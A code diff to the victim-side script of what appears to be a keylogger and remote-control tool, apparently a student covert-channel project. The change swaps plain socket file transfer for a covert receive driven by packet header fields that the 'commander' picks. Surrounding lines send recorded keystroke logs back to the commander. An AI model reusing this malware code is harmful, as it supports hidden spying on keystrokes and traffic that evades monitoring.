@@ -1,6 +1,4 @@
 import threading
-import time
-from scapy.sendrecv import sniff
 from victim_utils import *
 
 if __name__ == '__main__':
@@ -95,31 +93,21 @@ if __name__ == '__main__':
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
-                    # Call to receive the file data and checksum from the client
-                    filename = client_socket.recv(1024).decode()
-                    print(constants.RECEIVING_FILE_MSG.format(filename))
+                    # Get configuration from commander (filename, header, header_field)
+                    res = client_socket.recv(1024).decode().split("/")
+                    filename = res[0]
+                    choices = (res[1], res[2])  # => (header, header_field)
 
-                    with open(filename, constants.WRITE_BINARY_MODE) as file:
-                        eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+                    # CHECK: If destination field choice, do nothing
+                    if constants.DESTINATION_ADDRESS_FIELD in choices:
+                        print(constants.FILE_TRANSFER_UNSUCCESSFUL)
+                        continue
+                        # return None
 
-                        while True:
-                            file_data = client_socket.recv(1024)
-                            if not file_data:
-                                break  # No more data received
-                            if file_data.endswith(eof_marker):
-                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                                break
-                            else:
-                                file.write(file_data)
+                    receive_file_covert(client_socket, client_address[0], client_address[1],
+                                        source_ip, source_port, choices, filename)
 
-                    # Send ACK to commander (if good)
-                    if is_file_openable(filename):
-                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
-                        client_socket.send(constants.VICTIM_ACK.encode())
-                    else:
-                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-
-                # c) Check if data is to send recorded keystroked file to commander
+                # c) Check if data is to send recorded keystroked file(s) to commander
                 if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
                     print(constants.CLIENT_RESPONSE.format(data.decode()))
                     print(constants.GET_KEYLOG_REQUEST_MSG)
